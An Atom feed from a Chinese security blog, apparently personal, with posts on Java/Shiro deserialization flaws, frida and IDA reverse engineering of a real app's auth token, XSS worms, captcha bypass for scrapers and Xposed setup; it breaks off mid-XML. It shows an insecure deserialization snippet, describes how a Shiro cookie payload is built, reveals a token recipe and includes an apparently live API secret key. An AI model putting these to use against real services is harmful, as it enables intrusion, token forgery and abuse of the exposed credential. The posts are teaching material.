<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>风景这边独好</title>
  
  <subtitle>小风大浪，地狱天堂</subtitle>
  <link href="http://yejuns.github.io/atom.xml" rel="self"/>
  
  <link href="http://yejuns.github.io/"/>
  <updated>2021-08-02T06:19:31.941Z</updated>
  <id>http://yejuns.github.io/</id>
  
  <author>
    <name>Ye-Jun</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>web安全之反序列化漏洞-java</title>
    <link href="http://yejuns.github.io/2021/06/14/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-java/"/>
    <id>http://yejuns.github.io/2021/06/14/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-java/</id>
    <published>2021-06-14T08:01:51.000Z</published>
    <updated>2021-08-02T06:19:31.941Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-java序列化与反序列化"><a href="#1-java序列化与反序列化" class="headerlink" title="1.java序列化与反序列化"></a>1.java序列化与反序列化</h3><p>在Java中，只要一个类实现了<code>java.io.Serializable</code>接口，那么它就可以通过<code>ObjectInputStream</code>与<code>ObejctOutputStream</code>序列化.</p><h3 id="2-漏洞原因"><a href="#2-漏洞原因" class="headerlink" title="2.漏洞原因"></a>2.漏洞原因</h3><p>当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码，<br>比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取输入流,并转换对象</span></span><br><span class="line">InputStream in=request.getInputStream();</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line"><span class="comment">//恢复对象</span></span><br><span class="line">ois.readObject();</span><br><span class="line">ois.close();</span><br></pre></td></tr></table></figure><p>暴露或间接暴露反序列化API，导致用户可以操作传入数据，攻击者可以构造反序列化对象并执行恶意代码</p><h3 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h3><p>shiro 1.2.24以前的版本中默认使用了 cookieRemenberMeManager ,其处理cookie的流程是:</p><p><code>得到 rememberMe 的cookie值 -&gt; Base64解码 -&gt; AES解密 -&gt; 反序列化</code></p><p>由于AES的秘钥是硬编码在程序中，所以攻击者可以构造恶意数据造成反序列化的RCE漏洞。 payload 构造的顺序是相反的</p><p><code>恶意命令 -&gt; 序列化 -&gt; AES加密 -&gt;base64编码 -&gt; 发送cookie</code></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><blockquote><p> <a href="https://www.freebuf.com/vuls/270859.html">https://www.freebuf.com/vuls/270859.html</a><br> <a href="https://bbs.ichunqiu.com/thread-61162-1-1.html">https://bbs.ichunqiu.com/thread-61162-1-1.html</a><br> <a href="https://www.freebuf.com/vuls/170344.html">https://www.freebuf.com/vuls/170344.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1-java序列化与反序列化&quot;&gt;&lt;a href=&quot;#1-java序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;1.java序列化与反序列化&quot;&gt;&lt;/a&gt;1.java序列化与反序列化&lt;/h3&gt;&lt;p&gt;在Java中，只要一个类实现了&lt;code&gt;j</summary>
      
    
    
    
    
    <category term="web安全" scheme="http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向第十一课 - frida的主动调用</title>
    <link href="http://yejuns.github.io/2021/05/02/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E4%B8%80%E8%AF%BE%20/"/>
    <id>http://yejuns.github.io/2021/05/02/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E4%B8%80%E8%AF%BE%20/</id>
    <published>2021-05-02T04:01:51.000Z</published>
    <updated>2021-08-10T09:22:22.788Z</updated>
    
    <content type="html"><![CDATA[<p>除了使用frida进行hook, 很多场景我们需要用frida主动调用app的java方法和so方法。因为hook大多数时候只能被动的等待触发，如果函数一直不触发，我们就需要去主动调用。</p><h3 id="frida主动调用方法分类"><a href="#frida主动调用方法分类" class="headerlink" title="frida主动调用方法分类"></a>frida主动调用方法分类</h3><ol><li>frida 主动调用java类方法 （静态java方法）</li><li>frida 主动调用native类方法 (静态native方法）</li><li>frida 主动调用对象的java方法</li><li>frida 主动调用对象的native方法</li><li>frida 主动调用so方法</li></ol><p><strong>类方法可以直接调用 对象方法必须要有对象</strong></p><p>主动调用java静态代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">call_enc</span>(<span class="params">str_data, n_cnt</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">//这里写函数对应的类名</span></span><br><span class="line">  <span class="keyword">var</span> str_cls_name = <span class="string">&quot;com.wangtietou.test_rpc_all.Test_Enc_Dec&quot;</span>;</span><br><span class="line">  <span class="comment">//返回值 </span></span><br><span class="line">  <span class="keyword">var</span> str_ret = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="comment">//打log方便调试</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;===========&gt;on enc&quot;</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取类</span></span><br><span class="line">    <span class="keyword">var</span> obj = Java.use(str_cls_name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用类方法 因为这里是静态方法 所以可以直接调用</span></span><br><span class="line">    str_ret = obj.enc(str_data, n_cnt);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//打印结果 方便调试</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;enc result: &quot;</span> + str_ret);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> str_ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主动调用对象的java方法，我们有2种选择</p><ol><li>直接获取内存中已存在的对象（建议使用）</li><li>自己创建一个新对象</li></ol><p>因为运行过程中对象的成员的值可能已经发生了变化，所以如果重新创建一个对象，新对象的值还是初始值，在调用算法或者函数的时候，可能会产生影响。<br>所以这里建议直接获取内存中已经有的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从内存中（堆）直接搜索已存在的对象</span></span><br><span class="line">Java.choose(<span class="string">&#x27;xxx.xxx.xxx &#x27;</span>， <span class="comment">//这里写类名 </span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//onMatch 匹配到对象执行的回调函数</span></span><br><span class="line">   onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="comment">//堆中搜索完成后执行的回调函数</span></span><br><span class="line">   onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">call_enc</span>(<span class="params">str_data</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">//这里写函数对应的类名</span></span><br><span class="line">  <span class="keyword">var</span> str_cls_name = <span class="string">&quot;com.wangtietou.test_rpc_all.Test_Enc_Dec&quot;</span>;</span><br><span class="line">  <span class="comment">//返回值 </span></span><br><span class="line">  <span class="keyword">var</span> str_ret = <span class="literal">null</span>;</span><br><span class="line">  </span><br><span class="line">  Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      Java.choose(str_cls_name, </span><br><span class="line">      &#123;</span><br><span class="line">        onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//调试用</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;onMatch &quot;</span>);  </span><br><span class="line">            <span class="comment">//直接调用对象的函数 instance是找到的对象</span></span><br><span class="line">            str_ret = instance.enc(str_data);</span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;enc result: &quot;</span> + str_ret);</span><br><span class="line">  <span class="keyword">return</span> str_ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考资料</p><blockquote><p><a href="https://eternalsakura13.com/2020/07/04/frida/">https://eternalsakura13.com/2020/07/04/frida/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;除了使用frida进行hook, 很多场景我们需要用frida主动调用app的java方法和so方法。因为hook大多数时候只能被动的等待触发，如果函数一直不触发，我们就需要去主动调用。&lt;/p&gt;
&lt;h3 id=&quot;frida主动调用方法分类&quot;&gt;&lt;a href=&quot;#frida主</summary>
      
    
    
    
    
    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>web安全之XSS蠕虫</title>
    <link href="http://yejuns.github.io/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E8%A0%95%E8%99%AB/"/>
    <id>http://yejuns.github.io/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E8%A0%95%E8%99%AB/</id>
    <published>2021-04-21T03:01:51.000Z</published>
    <updated>2021-08-02T15:10:34.004Z</updated>
    
    <content type="html"><![CDATA[<h2 id="xss蠕虫"><a href="#xss蠕虫" class="headerlink" title="xss蠕虫"></a>xss蠕虫</h2><p>一种跨站脚本病毒，大多使用JavaScript 脚本编写，突破浏览器的安<br>全限制，XSS 蠕虫基于社会工程学诱使用户点击访问其发出的恶意邀请链接在网站上感染访问网站的用户，受感染的用户发送含有蠕虫的内容，再感染安全的用户。</p><h3 id="XSS蠕虫一般原理"><a href="#XSS蠕虫一般原理" class="headerlink" title="XSS蠕虫一般原理"></a>XSS蠕虫一般原理</h3><ol><li>基于存储型XSS 漏洞，攻击者在Web 页面植入恶意代码。</li><li>发送伪装的邀请链接。</li><li>用户点击链接被感染。</li><li>新感染用户的向好友发送伪装的邀请链接。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;xss蠕虫&quot;&gt;&lt;a href=&quot;#xss蠕虫&quot; class=&quot;headerlink&quot; title=&quot;xss蠕虫&quot;&gt;&lt;/a&gt;xss蠕虫&lt;/h2&gt;&lt;p&gt;一种跨站脚本病毒，大多使用JavaScript 脚本编写，突破浏览器的安&lt;br&gt;全限制，XSS 蠕虫基于社会工程学诱</summary>
      
    
    
    
    
    <category term="web安全" scheme="http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向第十课 - IDA+frida联合调试</title>
    <link href="http://yejuns.github.io/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/"/>
    <id>http://yejuns.github.io/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/</id>
    <published>2021-04-18T06:01:51.000Z</published>
    <updated>2021-08-08T13:29:04.434Z</updated>
    
    <content type="html"><![CDATA[<p>今天，需要做的是通过 IDA和 frida 联合调试，获取请求中的token。我们这是用 X安 app进行演示。</p><h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>用fiddler抓包，看一下请求头中的主要内容，确定我们要找的字段是 <code>X-APP-TOKEN</code>。</p><h2 id="apk逆向分析"><a href="#apk逆向分析" class="headerlink" title="apk逆向分析"></a>apk逆向分析</h2><p>首先，我们要去分析apk是否被加固，如果加固了就要进行脱壳，没有加固就直接分析。用 jadx打开apk，可以发现文件的各个目录非常清晰，所以很大程度上并没有加固</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-18.png"></p><p>接下来，我们可以直接在 jadx 中全局查找我们要找的字段，<code>X-APP-TOKEN</code>。（如果找不到的话，我们需要将要查找的字段进行合理分割，分别进行全局查找。）</p><p>我们找到了目标字段后，就可以进入生成<code>X-APP-TOKEN</code>的class，可以最终生成相关字段的代码是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">getAS</span><span class="params">(Context context, String str)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">   System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>属于 native 方法, 所以我们需要分析 libnative-lib.so 文件</p><p>先用ida静态分析相关 so 文件，全局查找 <code>getAS </code>方法，无法找到，说明这个方法是被手动注册的，因为手动注册都是通过 <code>JNI_onload</code> 方法，我们可以进行这个方法查看详细信息，确定<code>getAS </code>方法修改后的名字。注意到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegisterNatives(v3, v4, (const JNINativeMethod *)off_DB004, 1)</span><br></pre></td></tr></table></figure><p><code>RegisterNatives</code>是手动注册时调用，那么注册后的方法名肯定在这个方法里面，我们可以使用动态分析的方法获取注册后的方法名。最终可以知道，手动注册后的方法名为 <strong>getAuthString</strong>。<br>（其实手动注册后的方法名肯定还是有含义的，所以也可以 ctrl+f 慢慢找）</p><p>进入 getAuthString 方法，可以看到整个代码非常长，所以直接分析很难，我们首先要关注的是 <strong>返回值</strong>，因为返回值肯定是我们要的 token。</p><blockquote><p>token的一般格式是： timestamp + 固定字符串 + device_id + 其他</p></blockquote><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-19.png"><br>最后，我们发现 token 中还有一个关键信息 与 <code>b64_encode</code> 方法有关，因此我们可以使用 frida hook这个方法，将参数打印出来。</p><p>但是，使用 frida hook某个函数时，一般要用 <code>Module.getExportByName(&#39;.so&#39;,&#39;func_name&#39;)</code>方法，而要 hook 的函数需要被 exports 出来，我们通过 ida 的 Exports 窗口，无法发现 <code>b64_encode</code> 方法，因此不能用这种的方式 hook。</p><p>这里我们采用的方法是，通过<code>b64_encode</code>的绝对地址进行 hook。</p><p>那么，如何使用静态分析找出 <code>b64_encode</code> 的绝对地址呢？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> getAuthString_absulate_add = Module.getExportByName(<span class="string">&#x27;libnative-lib.so&#x27;</span>, <span class="string">&#x27;getAuthString&#x27;</span>);</span><br><span class="line"><span class="comment">// 首先获取一个方法的绝对地址</span></span><br><span class="line"><span class="keyword">var</span> native_lib_base_add = <span class="built_in">parseInt</span>(getAuthString_absulate_add) - <span class="built_in">parseInt</span>(<span class="string">&#x27;0x66500&#x27;</span>);</span><br><span class="line"><span class="comment">// 使用 绝对地址 - 相对地址 的方式，获取 so 文件的基地址</span></span><br><span class="line">send(<span class="string">&#x27;native_lib_base_add:&#x27;</span>+ptr(native_lib_base_add));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> md5_init_address = ptr(native_lib_base_add + <span class="built_in">parseInt</span>(<span class="string">&#x27;0x32455&#x27;</span>));</span><br><span class="line"><span class="comment">// 使用 基地址 + 相对地址 的方式，获取目标方法的绝对地址</span></span><br><span class="line">send(<span class="string">&#x27;md5_init_address: &#x27;</span> + md5_init_address);</span><br></pre></td></tr></table></figure><p>最终，我们可以确定 token 的生成规则是：</p><p> token = “token:// 1dek212ddovfkr “+  时间戳 + “$” + device_id + “&amp;” + packagename</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天，需要做的是通过 IDA和 frida 联合调试，获取请求中的token。我们这是用 X安 app进行演示。&lt;/p&gt;
&lt;h2 id=&quot;抓包分析&quot;&gt;&lt;a href=&quot;#抓包分析&quot; class=&quot;headerlink&quot; title=&quot;抓包分析&quot;&gt;&lt;/a&gt;抓包分析&lt;/h2&gt;&lt;</summary>
      
    
    
    
    
    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>爬虫过验证码</title>
    <link href="http://yejuns.github.io/2021/04/09/%E7%88%AC%E8%99%AB%E4%B9%8B%E8%BF%87%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    <id>http://yejuns.github.io/2021/04/09/%E7%88%AC%E8%99%AB%E4%B9%8B%E8%BF%87%E9%AA%8C%E8%AF%81%E7%A0%81/</id>
    <published>2021-04-09T08:01:51.000Z</published>
    <updated>2021-08-05T06:42:49.668Z</updated>
    
    <content type="html"><![CDATA[<p>在我们写爬虫的过程中，目标网站常见的干扰手段就是设置验证码等，因此，这里将简单介绍一些绕过验证码的方式。</p><h2 id="1、使用pytesseract模块和PIL模块识别"><a href="#1、使用pytesseract模块和PIL模块识别" class="headerlink" title="1、使用pytesseract模块和PIL模块识别"></a>1、使用pytesseract模块和PIL模块识别</h2><p>使用pip安装相关的包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pytesseract</span><br><span class="line">pip install pil</span><br></pre></td></tr></table></figure><p>整个验证码识别的思路很简单：</p><ol><li>截取整个界面</li><li>获取验证码位置的坐标，并截取对应位置的图片</li><li>使用pytesseract模块进行验证</li></ol><p>主要的功能代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#打开谷歌浏览器</span></span><br><span class="line">   browser = webdriver.Chrome()</span><br><span class="line">   <span class="comment">#打开首页</span></span><br><span class="line">   browser.get(<span class="string">&quot;http://localhost:8080/jpress/user/register&quot;</span>)</span><br><span class="line">   browser.maximize_window()</span><br><span class="line">   <span class="comment">#获取验证码图片</span></span><br><span class="line">   t = time.time()</span><br><span class="line">   picture_name1 = <span class="built_in">str</span>(t)+<span class="string">&#x27;.png&#x27;</span></span><br><span class="line">   browser.save_screenshot(picture_name1)</span><br><span class="line">   ce = browser.find_element_by_id(<span class="string">&quot;captchaimg&quot;</span>)</span><br><span class="line">   print(ce.location)</span><br><span class="line">   left = ce.location[<span class="string">&#x27;x&#x27;</span>]</span><br><span class="line">   top = ce.location[<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line">   right = ce.size[<span class="string">&#x27;width&#x27;</span>] + left</span><br><span class="line">   height = ce.size[<span class="string">&#x27;height&#x27;</span>] + top</span><br><span class="line">   im = Image.<span class="built_in">open</span>(picture_name1)</span><br><span class="line">   <span class="comment"># 抠图</span></span><br><span class="line">   img = im.crop((left,top,right, height))</span><br><span class="line">   t = time.time()</span><br><span class="line">   picture_name2 = <span class="built_in">str</span>(t)+<span class="string">&#x27;.png&#x27;</span></span><br><span class="line">   img.save(picture_name2)<span class="comment">#这里就是截取到的验证码图片</span></span><br><span class="line">   browser.close()</span><br></pre></td></tr></table></figure><p>pytesseract虽然很简单直观，但是无法处理比较复杂的验证码。这时候其实我们还可以使用一些方法对图片进行处理，提供识别率。比如对截取的图片转为灰度，将有效信息转为黑，背景和干扰转为白色。</p><p>由于我们需要找到一个像素阈值能够将灰度图片中真实数据和背景干扰分开，因此这一步骤可以借助PS等工具，我们在这里设置为200</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">img = image_obj.convert(<span class="string">&quot;L&quot;</span>)  <span class="comment"># 转灰度图</span></span><br><span class="line">pixdata = img.load()</span><br><span class="line">w, h = img.size</span><br><span class="line">threshold = <span class="number">200</span></span><br><span class="line"><span class="comment"># 遍历所有像素，大于阈值的为黑色</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h): <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w): <span class="keyword">if</span> pixdata[x, y] &lt; threshold: pixdata[x, y] =<span class="string">&quot; 0&quot;</span> <span class="keyword">else</span>:&gt;</span><br><span class="line"><span class="comment"># 根据像素二值结果重新生成图片</span></span><br><span class="line">data = img.getdata()</span><br><span class="line">w, h = img.size</span><br><span class="line">black_point = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, w - <span class="number">1</span>): <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, h - <span class="number">1</span>): mid_pixel = data[w * y + x] <span class="keyword">if</span> mid_pixel &lt; <span class="number">50</span>: top_pixel =<span class="string">&quot; data[w * (y - 1) + x]&quot;</span> left_pixel =<span class="string">&quot; data[w * y + (x - 1)]&quot;</span> down_pixel =<span class="string">&quot; data[w * (y + 1) + x]&quot;</span> right_pixel =<span class="string">&quot; data[w * y + (x + 1)]&quot;</span> <span class="keyword">if</span> top_pixel &lt; <span class="number">10</span>: black_point +=<span class="string">&quot; 1&quot;</span> <span class="keyword">if</span> left_pixel &lt; <span class="number">10</span>: <span class="keyword">if</span> down_pixel &lt; <span class="number">10</span>: <span class="keyword">if</span> right_pixel &lt; <span class="number">10</span>: <span class="keyword">if</span> black_point &lt; <span class="number">1</span>: img.putpixel((x, y), <span class="number">255</span>) black_point =<span class="string">&quot; 0&quot;</span> img.show()&lt; code&gt;</span><br></pre></td></tr></table></figure><p>转换前的图片</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/srcapyselenium-7.png"></p><p>转换后的图片</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/srcapyselenium-8.png"></p><h2 id="2、使用第三方API接口帮助识别"><a href="#2、使用第三方API接口帮助识别" class="headerlink" title="2、使用第三方API接口帮助识别"></a>2、使用第三方API接口帮助识别</h2><p>我以前是使用<code>showapi</code>,当然也可以选择别的方法，<a href="https://www.showapi.com/apiGateway/view/2360">地址</a></p><p>整个验证的流程是：</p><ol><li>下载官方提供的SDK包</li><li>在请求参数中加入自己的key</li><li>把图片和key值一起传给远程API，接收识别出的结果</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.ShowapiRequest <span class="keyword">import</span> ShowapiRequest</span><br><span class="line"></span><br><span class="line">r = ShowapiRequest(<span class="string">&quot;http://route.showapi.com/184-4&quot;</span>,<span class="string">&quot;272526&quot;</span>,<span class="string">&quot;a924d4e982ae404b8a068b4d1c7784f2&quot;</span> )</span><br><span class="line">r.addFilePara(<span class="string">&quot;image&quot;</span>, <span class="string">&quot;test.png&quot;</span>)</span><br><span class="line">r.addBodyPara(<span class="string">&quot;typeId&quot;</span>, <span class="string">&quot;34&quot;</span>)</span><br><span class="line">r.addBodyPara(<span class="string">&quot;convert_to_jpg&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">r.addBodyPara(<span class="string">&quot;needMorePrecise&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">res = r.post()</span><br><span class="line">result = res.text</span><br><span class="line">print(result)</span><br><span class="line">body = res.json()[<span class="string">&#x27;showapi_res_body&#x27;</span>]</span><br><span class="line">print(body[<span class="string">&#x27;Result&#x27;</span>])</span><br><span class="line"><span class="comment"># print(res.text) # 返回信息</span></span><br></pre></td></tr></table></figure><p>有时候我们也可以自己使用<code>tensorflow</code>进行训练.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在我们写爬虫的过程中，目标网站常见的干扰手段就是设置验证码等，因此，这里将简单介绍一些绕过验证码的方式。&lt;/p&gt;
&lt;h2 id=&quot;1、使用pytesseract模块和PIL模块识别&quot;&gt;&lt;a href=&quot;#1、使用pytesseract模块和PIL模块识别&quot; class=&quot;h</summary>
      
    
    
    
    
    <category term="爬虫" scheme="http://yejuns.github.io/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向第九课 - xposed</title>
    <link href="http://yejuns.github.io/2021/04/01/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B9%9D%E8%AF%BE/"/>
    <id>http://yejuns.github.io/2021/04/01/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B9%9D%E8%AF%BE/</id>
    <published>2021-04-01T03:08:51.000Z</published>
    <updated>2021-08-12T11:31:06.075Z</updated>
    
    <content type="html"><![CDATA[<h2 id="xposed-原理"><a href="#xposed-原理" class="headerlink" title="xposed 原理"></a>xposed 原理</h2><p>Xposed 是一个 Android 平台上的动态劫持框架，它的原理是替换安卓系统 /system/bin 目录下的 app_process 来控制 zygote 进程，使得app_pross在启动时会加载 XposedBridge.jar，从而实现对zygode进程以及其创建的虚拟机的劫持，最终对系统的某些功能实现接管。(其实就是一个反射的过程)</p><p>优点: xposed 可以在我们不破坏apk自身的情况下实现对函数的hook，修改函数的参数和返回值，改变函数的结构并执行我们自己的代码,用好了xposed可以对我们的逆向过程起到事半功倍的作用。</p><p>缺点:本身不能对 so 中的函数进行修改 需要结合其他框架。</p><h2 id="开发-xposed-模块过程"><a href="#开发-xposed-模块过程" class="headerlink" title="开发 xposed 模块过程"></a>开发 xposed 模块过程</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>Android-studio是最新版，这边手机和模拟器装的都是 xposed89 的框架，因此 使用的 XposedBridge.jar 也是89版本，<a href="https://github.com/924587628/XposedBridgeAPI">下载地址</a>,</p><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>1、在AS中新建项目，然后将 XposedBridgeApi-89.jar放到lib目录下 右键 Add As Library 将jar包添加进依赖</p><p>2、打开项目 src/main目录下的 AndroidManifest.xml文件，在 application 标签里面添加如下内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line">        